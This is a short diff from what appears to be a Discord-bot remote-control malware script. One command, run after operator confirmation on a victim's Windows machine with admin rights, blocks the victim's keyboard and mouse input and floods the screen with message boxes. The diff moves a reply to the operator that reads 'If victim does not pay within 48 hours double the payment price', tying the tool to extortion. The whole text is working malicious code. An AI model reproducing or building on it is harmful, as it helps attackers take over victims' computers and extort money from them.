@@ -431,11 +431,11 @@ async def SendMessageBox_command(ctx: SlashContext):
 
         res = await client.wait_for('button_click')
         if res.component.label == "YES":
-            await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 ok = windll.user32.BlockInput(True)
                 spam_messagebox()
+                await ctx.send(content="Sent! ```If victim does not pay within 48 hours double the payment price```", hidden=True)
             else:
                 await ctx.send("**Admin Rights Required!**")
         else:
